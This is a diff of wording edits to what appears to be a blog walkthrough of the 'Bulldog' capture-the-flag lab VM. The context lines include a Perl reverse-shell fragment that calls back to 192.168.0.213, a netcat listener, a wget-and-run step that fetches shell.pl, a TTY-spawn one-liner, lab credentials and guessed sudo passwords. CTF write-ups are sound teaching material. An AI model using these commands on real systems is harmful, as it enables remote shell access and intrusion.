@@ -209,7 +209,7 @@ No cigar. We need to authenticate first. But where? Maybe we will be able to do 
 
 <img src="/img/blog/bulldog/Bulldog05.png">
 
-Indeed we are! Let's login using `sarah:bulldoglover` or `nick:bulldog` credentials and see what we get.
+Indeed we are! Log in using `sarah:bulldoglover` or `nick:bulldog` credentials and see what we get.
 
 <img src="/img/blog/bulldog/Bulldog06.png">
 
@@ -244,7 +244,7 @@ use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 
 `1234 - port to connect back to` 
 
-After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* retrieves the file from our webserver and *perl* compiles + runs it. 
+We launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* retrieves the file from our webserver and *perl* compiles + runs it. 
 
 <img src="/img/blog/bulldog/Bulldog11.png">
 
@@ -279,7 +279,7 @@ GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
 crtstuff.c
 ######Continues######
 ```
-`sudo su root` tells us that the hidden password will probably be used for sudo operation. Let's keep that in mind. Now, can you see any pattern? It all comes down to your own imagination and luck. Just try connecting words together and see if you can get a valid password to work with sudo. My attempts included:
+`sudo su root` tells us that the hidden password will probably be used for sudo operation. Make sure to keep that in mind. Now, can you see any pattern? It all comes down to your own imagination and luck. Just try connecting words together and see if you can get a valid password to work with sudo. My attempts included:
 
 * SUPERultimatePASSWORD
 * YOUCANTGETSUPERULTIMATEPASSWORD
@@ -293,7 +293,7 @@ crtstuff.c
 
 *TTY shell command:* `python -c 'import pty; pty.spawn("/bin/sh")'`
 
-After what it seemes ages, I manage to get the correct password! `SUPERultimatePASSWORDyouCANTget`. 
+A bit later *(1 hour)*, I manage to guess the correct password! `SUPERultimatePASSWORDyouCANTget`. 
 
 <img src="/img/blog/bulldog/Bulldog13.png">
 
